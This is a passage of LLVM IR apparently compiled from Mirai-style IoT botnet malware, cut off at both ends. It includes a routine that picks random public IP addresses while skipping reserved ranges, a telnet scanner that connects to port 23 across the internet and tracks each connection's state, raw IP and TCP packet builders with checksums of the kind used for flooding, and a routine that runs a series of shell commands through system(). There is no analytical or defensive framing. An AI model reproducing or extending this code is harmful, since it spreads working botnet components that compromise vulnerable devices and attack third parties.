  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #5
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #5
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #5
  ret i32 %180
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.488, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.489, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.490, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.491, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.492, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.493, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.494, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.495, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.496, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.497, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.498, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.499, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.500, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  br label %32

; <label>:32:                                     ; preds = %30, %2
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 1025) #5
  store i8* %38, i8** %17, align 8
  %39 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1025, i32 1, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %19, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %48

; <label>:48:                                     ; preds = %66, %32
  %49 = load i32, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %54
  %56 = bitcast %struct.telstate_t* %55 to i8*
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 32, i32 16, i1 false)
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 3
  store i8 1, i8* %60, align 1
  %61 = load i8*, i8** %17, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %63
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i32 0, i32 9
  store i8* %61, i8** %65, align 8
  br label %66

; <label>:66:                                     ; preds = %52
  %67 = load i32, i32* %6, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %6, align 4
  br label %48

; <label>:69:                                     ; preds = %48
  br label %70

; <label>:70:                                     ; preds = %885, %69
  br label %71

; <label>:71:                                     ; preds = %70
  store i32 0, i32* %6, align 4
  br label %72

; <label>:72:                                     ; preds = %882, %71
  %73 = load i32, i32* %6, align 4
  %74 = load i32, i32* %5, align 4
  %75 = icmp slt i32 %73, %74
  br i1 %75, label %76, label %885

; <label>:76:                                     ; preds = %72
  %77 = load i32, i32* %6, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 7
  %81 = load i32, i32* %80, align 16
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %90

; <label>:83:                                     ; preds = %76
  %84 = call i64 @time(i64* null) #5
  %85 = trunc i64 %84 to i32
  %86 = load i32, i32* %6, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 7
  store i32 %85, i32* %89, align 16
  br label %90

; <label>:90:                                     ; preds = %83, %76
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 2
  %95 = load i8, i8* %94, align 8
  %96 = zext i8 %95 to i32
  switch i32 %96, label %881 [
    i32 0, label %97
    i32 1, label %233
    i32 2, label %336
    i32 3, label %388
    i32 4, label %433
    i32 5, label %485
    i32 6, label %530
    i32 7, label %630
    i32 8, label %712
  ]

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* %6, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 3
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 1
  br i1 %104, label %105, label %125

; <label>:105:                                    ; preds = %97
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %107
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %108, i32 0, i32 9
  %110 = load i8*, i8** %109, align 8
  store i8* %110, i8** %20, align 8
  %111 = load i32, i32* %6, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %112
  %114 = bitcast %struct.telstate_t* %113 to i8*
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 32, i32 16, i1 false)
  %115 = load i8*, i8** %20, align 8
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 9
  store i8* %115, i8** %119, align 8
  %120 = call i32 @getRandomPublicIP()
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 1
  store i32 %120, i32* %124, align 4
  br label %173

; <label>:125:                                    ; preds = %97
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 3
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %172

; <label>:133:                                    ; preds = %125
  %134 = load i32, i32* %6, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = add i8 %138, 1
  store i8 %139, i8* %137, align 2
  %140 = load i32, i32* %6, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 5
  %144 = load i8, i8* %143, align 1
  %145 = add i8 %144, 1
  store i8 %145, i8* %143, align 1
  %146 = load i32, i32* %6, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %147
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %148, i32 0, i32 5
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i64
  %152 = icmp eq i64 %151, 35
  br i1 %152, label %153, label %158

; <label>:153:                                    ; preds = %133
  %154 = load i32, i32* %6, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 3
  store i8 1, i8* %157, align 1
  br label %882

; <label>:158:                                    ; preds = %133
  %159 = load i32, i32* %6, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %160
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %161, i32 0, i32 4
  %163 = load i8, i8* %162, align 2
  %164 = zext i8 %163 to i64
  %165 = icmp eq i64 %164, 35
  br i1 %165, label %166, label %171

; <label>:166:                                    ; preds = %158
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 3
  store i8 1, i8* %170, align 1
  br label %882

; <label>:171:                                    ; preds = %158
  br label %172

; <label>:172:                                    ; preds = %171, %125
  br label %173

; <label>:173:                                    ; preds = %172, %105
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %174, align 4
  %175 = call zeroext i16 @htons(i16 zeroext 23) #10
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %175, i16* %176, align 2
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %178 = getelementptr inbounds [8 x i8], [8 x i8]* %177, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 8, i32 4, i1 false)
  %179 = load i32, i32* %6, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  store i32 %183, i32* %185, align 4
  %186 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %187 = load i32, i32* %6, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  store i32 %186, i32* %190, align 16
  %191 = load i32, i32* %6, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %192
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %193, i32 0, i32 0
  %195 = load i32, i32* %194, align 16
  %196 = icmp eq i32 %195, -1
  br i1 %196, label %197, label %198

; <label>:197:                                    ; preds = %173
  br label %882

; <label>:198:                                    ; preds = %173
